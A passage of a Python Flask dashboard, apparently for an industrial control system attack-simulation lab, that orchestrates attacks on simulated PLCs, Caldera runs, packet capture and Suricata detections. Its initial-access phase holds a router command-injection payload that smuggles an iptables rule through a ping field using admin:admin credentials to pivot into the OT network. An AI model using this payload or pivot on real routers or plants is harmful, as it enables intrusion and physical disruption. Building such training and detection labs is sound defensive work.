            #    manages its own simulation lifecycle and does not request it.)
            if want_warmup and lab_profile:
                _log("=" * 60)
                _log("[SIM] STARTING TARGET SIMULATION")
                _log("=" * 60)
                _log("[SIM] bringing the target to normal operation ...")
                try:
                    p = wp.plan(attack_id)
                    if not p.get("noviz"):
                        host = _resolved_plc().get(p.get("plc"), "plc-" + str(p.get("plc")))
                        if wp.restore(p, host):
                            _log("[SIM] normal control restored - target running in AUTO mode")
                        else:
                            _log("[SIM] target running in AUTO mode")
                except Exception as e:
                    _log(f"[SIM] warmup note: {e}")
                for remaining in range(10, 0, -5):
                    if attack_id in STOPPED:
                        _log("[SIM] stopped by operator during warmup - attack not launched.")
                        return
                    _log(f"[SIM] target running normally - attack launches in {remaining}s ...")
                    time.sleep(5)
                _log("[SIM] >>> warmup complete - launching the attack")
                _log("")

            # ── Briefing: 30-second context before attack ─────────────────
            briefing = a.get("briefing", [])
            if briefing:
                _log("━" * 60)
                _log("  ATTACK BRIEFING")
                _log("━" * 60)
                for line in briefing:
                    _log(f"  {line}" if line else "")
                _log("━" * 60)
                _log("")
                if lab_profile:
                    time.sleep(2)        # snappy for iterative container/local runs
                else:
                    for remaining in range(30, 0, -5):
                        _log(f"  Attack launches in {remaining}s ...")
                        time.sleep(5)
                _log("  >>> LAUNCHING ATTACK NOW")
                _log("")

            # ── Optional packet capture: for lab profiles start it BEFORE Phase 0
            #    so the pcap spans the whole kill chain (router RCE + OT payload).
            #    Esxi starts it later (unchanged) to preserve its behavior.
            if want_capture and lab_profile:
                _start_capture(attack_id, a, ts, _log)

            # ── Phase 0: initial access ───────────────────────────────────
            if attack_id != "router_exploit" and lab_profile:
                if a.get("initial_access") == "router":
                    _run_router_phase(attack_id, a, _log)
                    if attack_id in STOPPED:
                        _log("[ATTACK] Stopped by operator during initial access - OT payload not sent.")
                        return
                else:
                    _log(f"[INFO] {CURRENT_PROFILE} profile - no router initial-access phase "
                         "for this attack; attacking the OT target directly.")
                    _log("")
            if attack_id != "router_exploit" and not lab_profile:
                _log("=" * 60)
                _log("[PHASE 0] INITIAL ACCESS - Router Compromise")
                _log("  Attacker: 192.168.0.11")
                _log(f"  Vector A: HTTP command injection  {PLC['router']}:8080")
                _log(f"  Vector B: SSH bruteforce (admin:admin)  {PLC['router']}:22")
                _log("=" * 60)
                exploit_proc = subprocess.Popen(
                    [PYTHON, os.path.join(ATTACKER_SCRIPTS, "01_router_exploit.py"),
                     PLC["router"], "--username", "admin", "--password", "admin",
                     "--command", "id && hostname && ip addr show | grep 'inet ' | grep -v 127"],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, cwd=SIM_DIR,
                )
                for line in exploit_proc.stdout:
                    _log(line.rstrip())
                exploit_proc.wait(timeout=25)
                _log("")
                _log("[PHASE 0] [+] Router compromised via command injection (root shell)")
                _log("[PHASE 0] Post-compromise: punching FORWARD rule via router command injection")
                _log("[PHASE 0]   (attacker modifies router firewall after gaining root)")
                # Post-compromise firewall modification via command injection on the router.
                # Realistic: attackers always modify firewall rules post-compromise.
                # In full live demo this is replaced by Meterpreter SOCKS tunnel.
                try:
                    import requests as _req
                    _req.packages.urllib3.disable_warnings()
                    _s = _req.Session()
                    _s.post(f"http://{PLC['router']}:8080/login",
                            data={'username': 'admin', 'password': 'admin'},
                            timeout=5, verify=False)
                    _s.post(f"http://{PLC['router']}:8080/api/diagnostic",
                            json={'tool': 'ping', 'target':
                                  '127.0.0.1 -c 1; '
                                  'iptables -C FORWARD -s 192.168.0.11 -d 192.168.1.0/24 '
                                  '-j ACCEPT 2>/dev/null || '
                                  'iptables -I FORWARD 1 -s 192.168.0.11 -d 192.168.1.0/24 -j ACCEPT'},
                            timeout=8, verify=False)
                    _log("[PHASE 0] [+] Router FORWARD rule punched - Kali has OT access via pivot")
                except Exception as _e:
                    _log(f"[PHASE 0] FORWARD rule: {_e}")
                _log("")

            # ── Phase 0.5: Malware-specific IT phase ──────────────────────
            it_script = IT_PHASE_SCRIPTS.get(attack_id)
            if it_script and os.path.exists(it_script) and not lab_profile:
                # Per-attack IT phase args override - default targets HMI
                # CosmicEnergy overrides to historian (PIEHOP uses MSSQL, not WinRM)
                it_args = a.get('it_phase_args',
                                ['--hmi-ip', PLC['hmi'],
                                 '--hmi-user', 'operator', '--hmi-pass', 'labpass123'])
                it_target_desc = it_args[1] if len(it_args) > 1 else PLC['hmi']
                _log("=" * 60)
                _log(f"[IT PHASE] {a['name']} - malware delivery chain")
                _log(f"  Target: {it_target_desc}")
                _log("=" * 60)
                try:
                    it_proc = subprocess.Popen(
                        [PYTHON, it_script] + it_args,
                        stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        text=True, cwd=ATTACKER_SCRIPTS,
                    )
                    for line in it_proc.stdout:
                        _log(line.rstrip())
                    it_proc.wait(timeout=600)   # 10 min - WinRM steps take 3-5 min
                except Exception as e:
                    _log(f"[IT PHASE] Note: {e} - continuing with OT payload")
                _log("")

            # ── Optional: packet capture (tshark) - esxi starts it here, right
            #    before the OT payload (lab profiles already started it above).
            if want_capture and not lab_profile:
                _start_capture(attack_id, a, ts, _log)

            # ── Phase 1+: Actual malware simulation ───────────────────────
            # Pick the command for the active profile: lab profiles (docker/local)
            # use the container-scoped variant when one is defined; esxi uses the
            # full scenario.
            # A scenario either runs one payload script (cmd/cmd_lab) or an ordered
            # list of protocol operations (steps). Steps are built and validated
            # up front, so an invalid one fails before any packet is sent.
            if a.get("steps"):
                plan_ = _step_argvs(a)
                runs = [(argv, label, dur) for argv, label, dur in plan_]
            else:
                cmd = a["cmd_lab"] if (lab_profile and a.get("cmd_lab")) else a["cmd"]
                runs = [(cmd, None, 300)]

            _log("=" * 60)
            _log(f"[ATTACK] Launching {a['name']}"
                 + ("  (container-scoped variant)" if (lab_profile and a.get("cmd_lab")) else ""))
            _log(f"  Protocol: {a['protocol']}  Target: {a['target']}")
            if len(runs) > 1:
                _log(f"  Steps: {len(runs)}")
            _log("=" * 60)

            # One capture and one stop handle span every step, so a multi-step
            # scenario still yields a single continuous, replayable pcap.
            for i, (cmd, label, dur) in enumerate(runs, 1):
                if attack_id in STOPPED:
                    _log("[ATTACK] Stopped by operator between steps.")
                    break
                if label:
                    _log(f"[STEP {i}/{len(runs)}] {label}")
                proc = subprocess.Popen(
                    cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.STDOUT,
                    text=True,
                    cwd=SIM_DIR,
                    start_new_session=True,    # own process group so /stop can kill it
                )
                PROCS[attack_id] = proc
                for line in proc.stdout:
                    _log(line.rstrip())
                proc.wait(timeout=dur + 60 if label else 300)

            _log("")
            _log("[ATTACK] Simulation complete - PLCs remain in attacked state")
            _log("[ATTACK] Use the RESET PLCs button to restore normal operations")

        except subprocess.TimeoutExpired:
            _kill_proc(PROCS.get(attack_id))
            _log("[DEMO] Simulation stopped after 5 minutes")
        except Exception as e:
            _log(f"ERROR: {e}")
        finally:
            PROCS.pop(attack_id, None)
            _stop_capture(attack_id, _log)
            _log(f"[LOG] Finished: {datetime.now().isoformat()}")
            running[attack_id] = False

    threading.Thread(target=run, daemon=True).start()
    return jsonify({"status": "started", "capture": want_capture})


@app.route("/stop/<attack_id>", methods=["POST"])
def stop(attack_id):
    proc = PROCS.get(attack_id)
    was_running = bool(running.get(attack_id))
    if was_running:
        STOPPED.add(attack_id)   # also abort between phases (e.g. during initial access)
    if proc:
        _kill_proc(proc)
    if not proc and not was_running:
        return jsonify({"status": "not_running"})
    logs.setdefault(attack_id, []).append("[STOP] Attack terminated by operator.")
    return jsonify({"status": "stopped"})


@app.route("/download/<path:fname>")
def download(fname):
    from flask import send_from_directory
    return send_from_directory(CAPTURE_DIR, os.path.basename(fname), as_attachment=True)


@app.route("/api/captures")
def api_captures():
    """List saved pcaps (newest first) with download links + which run is capturing now."""
    items = []
    try:
        for fn in sorted(os.listdir(CAPTURE_DIR), reverse=True):
            if not fn.endswith(".pcap"):
                continue
            st = os.stat(os.path.join(CAPTURE_DIR, fn))
            # filename pattern: <attack-id>_<YYYYMMDD_HHMMSS>.pcap
            attack = fn.rsplit("_", 2)[0] if fn.count("_") >= 2 else fn[:-5]
            items.append({"name": fn, "attack": attack, "size": st.st_size,
                          "mtime": int(st.st_mtime), "url": f"/download/{fn}"})
    except FileNotFoundError:
        pass
    return jsonify({"captures": items, "capturing": list(CAPTURES.keys()),
                    "path": "final_things/iec104_water_tank/demo/captures/"})


@app.route("/api/captures/<path:fname>", methods=["DELETE"])
def delete_capture(fname):
    path = os.path.join(CAPTURE_DIR, os.path.basename(fname))
    if os.path.exists(path) and path.endswith(".pcap"):
        os.remove(path)
        return jsonify({"status": "deleted"})
    return jsonify({"status": "not_found"}), 404


# ── OT detection sensor (Suricata) - live alert feed for the Detections tab ──
def _sensor_running():
    """Best-effort: is the opt-in Suricata sensor container up? (console has docker)."""
    try:
        out = subprocess.run(
            ["docker", "ps", "--filter", f"name={SENSOR_CONTAINER}",
             "--filter", "status=running", "--format", "{{.Names}}"],
            capture_output=True, text=True, timeout=4)
        return SENSOR_CONTAINER in out.stdout
    except Exception:
        return False


def _parse_alert(line):
    """Map one Suricata eve.json line to a compact alert dict, or None if not an alert."""
    try:
        ev = json.loads(line)
    except (ValueError, TypeError):
        return None
    if ev.get("event_type") != "alert":
        return None
    a = ev.get("alert", {})
    return {
        "ts": ev.get("timestamp", ""),
        "sid": a.get("signature_id"),
        "msg": a.get("signature", ""),
        "severity": a.get("severity", 3),
        "proto": ev.get("proto", ""),
        "src": ev.get("src_ip", ""),
        "dest": ev.get("dest_ip", ""),
        "dport": ev.get("dest_port", ""),
    }


def _tail_lines(path, max_bytes=262144):
    """Return the last lines of a file without reading the whole thing (eve.json can be large)."""
    try:
        with open(path, "rb") as f:
            f.seek(0, os.SEEK_END)
            size = f.tell()
            f.seek(max(0, size - max_bytes))
            data = f.read()
    except FileNotFoundError:
        return []
    return data.decode("utf-8", "replace").splitlines()


@app.route("/api/detections")
def api_detections():
    """Sensor status + most-recent alerts (initial paint for the Detections tab)."""
    alerts = []
    for line in _tail_lines(EVE_PATH):
        a = _parse_alert(line)
        if a:
            alerts.append(a)
    return jsonify({"running": _sensor_running(),
                    "eve_present": os.path.exists(EVE_PATH),
                    "alerts": alerts[-100:],
                    "hint": "make sensor-up"})


@app.route("/api/detections/rule/<int:sid>")
def api_detection_rule(sid):
    """Read-only: return the Suricata rule text (+ its section comment) for a signature id."""
    rule, comment, block = "", [], []
    try:
        with open(RULES_FILE) as f:
            for line in f:
                s = line.rstrip("\n")
                st = s.strip()
                if st == "":
                    block = []
                elif st.startswith("#"):
                    block.append(s)
                elif f"sid:{sid};" in s:           # a rule line matching this sid
                    comment, rule = block, s
                    break
                # non-matching rule lines keep `block` (shared section comment)
    except FileNotFoundError:
        pass
    return jsonify({"sid": sid, "found": bool(rule), "rule": rule,
                    "comment": "\n".join(comment)})


@app.route("/api/detections/log")
def api_detection_log():
    """The raw sensor log for ONE detection, identified by its exact timestamp + sid:
    the full eve.json record Suricata wrote, plus the matching fast.log one-liner. Powers
    the per-detection console view on the Detections tab."""
    ts = request.args.get("ts", "")
    sid = request.args.get("sid", "")
    record = None
    for line in _tail_lines(EVE_PATH, max_bytes=2_000_000):   # wider window than the table paint
        try:
            ev = json.loads(line)
        except (ValueError, TypeError):
            continue
        if (ev.get("event_type") == "alert"
                and ev.get("timestamp") == ts
                and str(ev.get("alert", {}).get("signature_id")) == str(sid)):
            record = ev
            break
    # fast.log line for the same detection: same sid, same fractional seconds (tz-agnostic).
    frac = ts.split(".")[-1].split("+")[0][:6] if "." in ts else ""
    tag = "[1:%s:" % sid
    fast = ""
    for line in _tail_lines(FAST_PATH, max_bytes=500_000):
        if tag in line and (not frac or frac in line):
            fast = line
            break
    return jsonify({"found": record is not None, "ts": ts, "sid": sid,
                    "fastlog": fast,
                    "eve": json.dumps(record, indent=2) if record else ""})


@app.route("/api/detections/stream")
def stream_detections():
    """Server-Sent Events: live-tail the sensor's eve.json, pushing only NEW alerts."""
    def gen():
        yield ("event: meta\ndata: "
               + json.dumps({"running": _sensor_running(),
                             "eve_present": os.path.exists(EVE_PATH)}) + "\n\n")
        # Byte-offset tail: track how far we have read and, each tick, read whatever was
        # appended past that point. This reliably picks up newly-written alerts on an
        # already-open stream (a plain readline() tail can stall on EOF). pos=None means
        # "start at the current end of file"; a shrink (rotation) resets to 0.
        pos = None
        buf = ""
        idle = 0
        try:
            while True:
                if not os.path.exists(EVE_PATH):
                    pos = None
                    buf = ""
                    time.sleep(1.0)
                    idle += 1
                    if idle % 10 == 0:
                        yield ": keep-alive\n\n"
                    continue
                size = os.path.getsize(EVE_PATH)
                if pos is None:
                    pos = size                 # first sight: stream only NEW alerts
                if size < pos:                 # truncated / rotated -> re-read from start
                    pos = 0
                    buf = ""
                if size > pos:
                    with open(EVE_PATH, "rb") as f:
                        f.seek(pos)
                        data = f.read()
                        pos = f.tell()
                    buf += data.decode("utf-8", "replace")
                    parts = buf.split("\n")
                    buf = parts.pop()          # keep any trailing partial line
                    for line in parts:
                        a = _parse_alert(line)
                        if a:
                            yield f"data: {json.dumps(a)}\n\n"
                            idle = 0
                    continue
                time.sleep(0.5)
                idle += 1
                if idle % 20 == 0:
                    yield ": keep-alive\n\n"
        except GeneratorExit:
            pass
    return Response(gen(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


# ── Caldera integration ───────────────────────────────────────────────────────
# The dashboard proxies Caldera's REST API server-side with the api_key, so the
# operator never has a second login. Caldera runs on otlab; its full UI (root:root)
# is published on the host for advanced use.
CALDERA_URL = os.environ.get("MRHOTSHOT_CALDERA_URL", "http://caldera:8888")
CALDERA_KEY = os.environ.get("MRHOTSHOT_CALDERA_KEY", "mrhotshot-red")
CALDERA_UI_PORT = os.environ.get("MRHOTSHOT_CALDERA_UI_PORT", "8889")


@app.route("/api/caldera/info")
def caldera_info():
    """Caldera reachability + a small summary for the dashboard panel."""
    import requests
    info = {"ui_port": CALDERA_UI_PORT, "up": False}
    try:
        r = requests.get(f"{CALDERA_URL}/api/v2/health", headers={"KEY": CALDERA_KEY}, timeout=5)
        if r.ok:
            info["up"] = True
            info["version"] = r.json().get("version")
        for key, path in (("abilities", "abilities"), ("agents", "agents"),
                          ("operations", "operations")):
            try:
                jr = requests.get(f"{CALDERA_URL}/api/v2/{path}",
                                  headers={"KEY": CALDERA_KEY}, timeout=5)
                info[key] = len(jr.json()) if jr.ok else 0
            except Exception:
                info[key] = 0
    except Exception as e:
        info["error"] = str(e)
    return jsonify(info)


@app.route("/api/caldera/<path:subpath>", methods=["GET", "POST"])
def caldera_proxy(subpath):
    """Forward to Caldera's REST API, injecting the api_key (no second login)."""
    import requests
    url = f"{CALDERA_URL}/api/v2/{subpath}"
    headers = {"KEY": CALDERA_KEY}
    try:
        if request.method == "POST":
            r = requests.post(url, headers=headers, json=request.get_json(silent=True), timeout=20)
        else:
            r = requests.get(url, headers=headers, params=request.args, timeout=20)
        return Response(r.content, status=r.status_code,
                        content_type=r.headers.get("content-type", "application/json"))
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)}), 502


@app.route("/custom", methods=["POST"])
def custom():
    """Metasploit-style custom-target run: pick a protocol + module, set that module's
    options (write what where), choose a run mode (once / repeat), fire at any host."""
    body = request.get_json(force=True) or {}
    proto = (body.get("protocol") or "").strip().lower()
    if proto not in CUSTOM_PROTOCOLS:
        return jsonify({"status": "error", "msg": "unknown protocol"}), 400
    # accept a hostname OR an IP (like Metasploit RHOSTS); argv is a list -> no shell.
    ip = (body.get("ip") or "").strip()
    if not ip or len(ip) > 255 or not all(c.isalnum() or c in ".-_" for c in ip):
        return jsonify({"status": "error", "msg": "invalid target host"}), 400
    label, default_port, script, extra = CUSTOM_PROTOCOLS[proto]
    module = (body.get("module") or "scenario").strip()
    mode = "repeat" if str(body.get("mode", "once")).lower() == "repeat" else "once"
    try:
        port = int(body.get("port") or default_port)
        duration = max(1, min(600, int(body.get("duration") or 15)))
        interval = max(0.2, min(60.0, float(body.get("interval") or 5)))
    except (TypeError, ValueError):
        return jsonify({"status": "error", "msg": "invalid port/duration/interval"}), 400
    if not 1 <= port <= 65535:
        return jsonify({"status": "error", "msg": "invalid port"}), 400
    with _STATE_LOCK:                        # atomic check-then-set: no double-start race
        if running.get("custom"):
            return jsonify({"status": "already_running"})
        running["custom"] = True

    # A configurable-console protocol + a real module -> its console; everything else
    # (and "scenario") -> the existing canned per-protocol attack script (unchanged).
    title = label
    reg = CONSOLE_BUILDERS.get(proto)
    if reg and module in reg[0]:
        try:
            cmd = reg[1](module, body.get("options") or {}, ip, port, mode, interval, duration)
        except ValueError as e:
            running["custom"] = False        # release on validation failure
            return jsonify({"status": "error", "msg": str(e)}), 400
        title = "%s / %s" % (label, module)
    else:
        script_path = script if os.path.isabs(script) else os.path.join(SIM_DIR, script)
        cmd = [PYTHON, script_path, "--target", ip, "--port", str(port),
               "--duration", str(duration)] + list(extra)
    want_capture = bool(body.get("capture"))
    pseudo = {"id": "custom", "name": f"Custom {title}", "protocol": label}

    logs["custom"] = []

    def run():
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        logfile = os.path.join(LOG_DIR, f"custom_{ts}.log")
        _prune_log_dir()

        def _log(line):
            _log_append("custom", line)
            with open(logfile, "a") as f:
                f.write(line + "\n")

        try:
            tail = f" every {interval:g}s for {duration}s" if mode == "repeat" else ""
            _log(f"[CUSTOM] {title} -> {ip}:{port}  mode={mode}{tail}")
            _log("=" * 60)
            if want_capture:
                _start_capture("custom", pseudo, ts, _log)
            proc = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                                    text=True, cwd=SIM_DIR, start_new_session=True)
            PROCS["custom"] = proc
            for line in proc.stdout:
                _log(line.rstrip())
            proc.wait(timeout=duration + 60)
            _log("")
            _log("[CUSTOM] Run finished.")
        except subprocess.TimeoutExpired:
            _kill_proc(PROCS.get("custom"))
            _log("[CUSTOM] Stopped (timeout).")
        except Exception as e:
            _log(f"ERROR: {e}")
        finally:
            PROCS.pop("custom", None)
            _stop_capture("custom", _log)
            running["custom"] = False

    threading.Thread(target=run, daemon=True).start()
    return jsonify({"status": "started"})


@app.route("/custom/stop", methods=["POST"])
def custom_stop():
    """Stop an in-progress custom run (needed to end a repeat/spam run)."""
    _kill_proc(PROCS.get("custom"))
    return jsonify({"status": "stopping"})


@app.route("/api/custom-protocols")
def api_custom_protocols():
    """Per protocol: default port + the module menu the UI renders (label + option
    fields). Modbus exposes the Metasploit-style module set; others a canned scenario."""
    out = {}
    for k, v in CUSTOM_PROTOCOLS.items():
        reg = CONSOLE_BUILDERS.get(k)
        if reg:
            modules = {mk: {"label": mv["label"], "fields": mv["fields"]}
                       for mk, mv in reg[0].items()}
            modules["scenario"] = {"label": SCENARIO_LABEL.get(k, "Run built-in scenario"), "fields": []}
        else:
            modules = {"scenario": {"label": "Run built-in scenario", "fields": []}}
        out[k] = {"label": v[0], "port": v[1], "modules": modules,
                  "host": CUSTOM_HOST.get(k, "")}
    return jsonify(out)


@app.route("/logs/<attack_id>")
def get_logs(attack_id):
    offset = int(request.args.get("offset", 0))
    lines  = logs.get(attack_id, [])[offset:][-LOG_MAX:]   # bound the response size
    return jsonify({"lines": lines, "running": running.get(attack_id, False)})


@app.route("/stream/<attack_id>")
def stream_logs(attack_id):
    """Server-Sent Events: push new log lines as they arrive (no polling)."""
    def gen():
        sent = 0
        idle = 0
        while True:
            buf = logs.get(attack_id, [])
            while sent < len(buf):
                yield f"data: {json.dumps(buf[sent])}\n\n"
                sent += 1
                idle = 0
            if not running.get(attack_id, False) and sent >= len(buf):
                yield "event: done\ndata: end\n\n"
                return
            time.sleep(0.4)
            idle += 1
            if idle % 25 == 0:
                yield ": keep-alive\n\n"
    return Response(gen(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.route("/watch/<attack_id>")
def watch_page(attack_id):
    """Full-page live visualizer for one attack, opened in a new tab from its card."""
    a = next((x for x in ATTACKS if x["id"] == attack_id), None)
    if not a:
        abort(404)
    plan_ = wp.plan(attack_id)
    return render_template("watch.html", attack=a, plan=plan_,
                           viz_modules=viz_modules(plan_.get("kind")))


@app.route("/watch/<attack_id>/stream")
def watch_stream(attack_id):
    """Server-Sent Events: push the live state of the process an attack targets, so
    the operator can watch it react. Reads the target PLC over IEC-104 or Modbus."""
    plan = wp.plan(attack_id)
    if plan.get("noviz"):
        return Response('event: meta\ndata: {"noviz": true}\n\n',
                        mimetype="text/event-stream", headers={"Cache-Control": "no-cache"})
    host = _resolved_plc().get(plan["plc"], "plc-" + plan["plc"])

    def gen():
        reader = None
        try:
            meta = {"process": plan["label"], "plc": plan["plc"],
                    "protocol": plan["proto"], "direct": plan["direct"],
                    "kind": plan.get("kind"), "attack": attack_id, "host": host,
                    "io": plan.get("io") or {}}
            yield f"event: meta\ndata: {json.dumps(meta)}\n\n"
            try:
                reader = wp.make_reader(plan["proto"], host, unit=plan.get("unit", 11))
            except Exception as e:
                yield f"data: {json.dumps({'online': False, 'error': str(e)[:140]})}\n\n"
                return
            idle = 0
            while True:
                try:
                    state = reader.read()
                except Exception as e:
                    state = {"online": False, "error": str(e)[:140]}
                yield f"data: {json.dumps(state)}\n\n"
                time.sleep(1.0)
                idle += 1
                if idle % 20 == 0:
                    yield ": keep-alive\n\n"
        except GeneratorExit:
            pass
        finally:
            if reader:
                reader.close()

    return Response(gen(), mimetype="text/event-stream",
                    headers={"Cache-Control": "no-cache", "X-Accel-Buffering": "no"})


@app.route("/reset", methods=["POST"])
def reset_plcs():
    with _STATE_LOCK:                        # atomic check-then-set: no double-start race
        if running.get("reset_plcs"):
            return jsonify({"status": "already_running"})
        running["reset_plcs"] = True
        logs["reset_plcs"] = []

    def run_reset():
        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
        logfile = os.path.join(LOG_DIR, f"reset_{ts}.log")
        _prune_log_dir()
        def _log(line):
            _log_append("reset_plcs", line)
            with open(logfile, "a") as f:
                f.write(line + "\n")

        try:
            _log(f"[RESET] Started: {datetime.now().isoformat()}")
            _log("=" * 60)
            _log("[RESET] Restoring ALL PLCs to normal operating state...")
            _log("=" * 60)
            if CURRENT_PROFILE == "docker":
                # Docker: restart the PLC containers (re-inits each process to its
                # setpoints). The esxi path below is left untouched.
                _log("[RESET] docker compose restart " + " ".join(PLC_SERVICES))
                _docker_restart(PLC_SERVICES, _log)
            else:
                proc = subprocess.Popen(
                    [PYTHON, RESET_SCRIPT],
                    stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                    text=True, cwd=DEMO_DIR,
                )
                for line in proc.stdout:
                    _log(line.rstrip())
                proc.wait(timeout=60)
            _log("[RESET] All PLCs restored - ready for next demo")
        except Exception as e:
            _log(f"ERROR: {e}")
        finally:
            _log(f"[LOG] Finished: {datetime.now().isoformat()}")
            running["reset_plcs"] = False

    threading.Thread(target=run_reset, daemon=True).start()
    return jsonify({"status": "started"})


@app.route("/reset/<attack_id>", methods=["POST"])
def reset_target(attack_id):
    """Restart just the PLC an attack targets, back to a clean live baseline. Docker
    profile only (esxi is left to the global /reset); synchronous so the visualizer
    can reset-then-launch."""
    if CURRENT_PROFILE != "docker":
        return jsonify({"status": "skipped", "msg": "per-target reset is docker-only"})
    plc = wp.plan(attack_id)["plc"]
    service = _service_for_plc(plc)
    if service not in PLC_SERVICES:
        return jsonify({"status": "error", "msg": f"no container for {plc}"}), 400
    try:
        _docker_restart([service], wait_ready=4)
        return jsonify({"status": "reset", "plc": plc, "service": service})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)[:140]}), 500


@app.route("/restore/<attack_id>", methods=["POST"])
def restore_target(attack_id):
    """Send the target process's normal-op protocol writes so it recovers from an
    attack (used by Pause - the plant bounces back without a full restart). Docker only."""
    if CURRENT_PROFILE != "docker":
        return jsonify({"status": "skipped"})
    p = wp.plan(attack_id)
    if p.get("noviz") or not p.get("restore"):
        return jsonify({"status": "no-restore"})
    host = _resolved_plc().get(p["plc"], "plc-" + p["plc"])
    try:
        ok = wp.restore(p, host)
        return jsonify({"status": "restored" if ok else "no-restore", "plc": p["plc"]})
    except Exception as e:
        return jsonify({"status": "error", "msg": str(e)[:140]}), 500


@app.route("/status")
def status():
    return jsonify({a["id"]: running[a["id"]] for a in ATTACKS})


# ── Session login ─────────────────────────────────────────────────────────────
# First step is a login screen. Default creds root:root (override with
# MRHOTSHOT_UI_USER / MRHOTSHOT_UI_PASS). For a real deployment set
# MRHOTSHOT_UI_PASS_HASH to a sha256 hex digest instead of a plaintext password
# (printf 'secret' | sha256sum); the hash takes precedence over MRHOTSHOT_UI_PASS.
# A shared token (MRHOTSHOT_UI_TOKEN) still works for programmatic access via the
# X-Auth-Token header. All comparisons are constant-time.
import hashlib  # noqa: E402
import hmac  # noqa: E402
from flask import redirect, session, url_for  # noqa: E402

app.secret_key = os.environ.get("MRHOTSHOT_SECRET") or os.urandom(24).hex()
UI_USER = os.environ.get("MRHOTSHOT_UI_USER", "root")
UI_PASS = os.environ.get("MRHOTSHOT_UI_PASS", "root")
UI_PASS_HASH = os.environ.get("MRHOTSHOT_UI_PASS_HASH")   # sha256 hex; wins over UI_PASS
UI_TOKEN = os.environ.get("MRHOTSHOT_UI_TOKEN")
_OPEN_PATHS = ("/login", "/static/")


def _ct_eq(a, b):
    return hmac.compare_digest(str(a), str(b))


def _pw_ok(pw, plain, hexhash):
    """Constant-time password check. A configured sha256 hex hash wins; otherwise
    compare against the plaintext password. Pure -> covered by _selftest_auth()."""
    if hexhash:
        return hmac.compare_digest(hashlib.sha256(pw.encode()).hexdigest(), hexhash.strip().lower())
    return hmac.compare_digest(pw, plain)


def _check_pw(pw):
    return _pw_ok(pw, UI_PASS, UI_PASS_HASH)


def _selftest_auth():
    h = hashlib.sha256(b"secret").hexdigest()
    assert _pw_ok("secret", "ignored", h) is True
    assert _pw_ok("wrong", "ignored", h) is False
    assert _pw_ok("root", "root", None) is True
    assert _pw_ok("nope", "root", None) is False


@app.before_request
def _auth_gate():
    if request.path.startswith(_OPEN_PATHS) or request.path == "/login":
        return
    if session.get("auth"):
        return
    if UI_TOKEN and _ct_eq(request.headers.get("X-Auth-Token", ""), UI_TOKEN):
        return
    # Browsers get the login page; API/XHR callers get 401.
    if request.method == "GET" and "text/html" in request.headers.get("Accept", ""):
        return redirect(url_for("login"))
    abort(401)


@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        user = request.form.get("username", "")
        pw = request.form.get("password", "")
        if _ct_eq(user, UI_USER) and _check_pw(pw):
            session["auth"] = True
            return redirect(url_for("index"))
        return render_template("login.html", error="Invalid credentials"), 401
    if session.get("auth"):
        return redirect(url_for("index"))
    return render_template("login.html", error=None)


@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("login"))


if __name__ == "__main__":
    _selftest_auth()
    host = os.environ.get("MRHOTSHOT_UI_HOST", "127.0.0.1")
    port = int(os.environ.get("MRHOTSHOT_UI_PORT", "8888"))
    _auth_mode = "hash" if UI_PASS_HASH else "password"
    print(f"mrhOTshOT Demo UI starting on http://{host}:{port}  (login {UI_USER}:**** [{_auth_mode}])")
    app.run(host=host, port=port, debug=False, threaded=True)
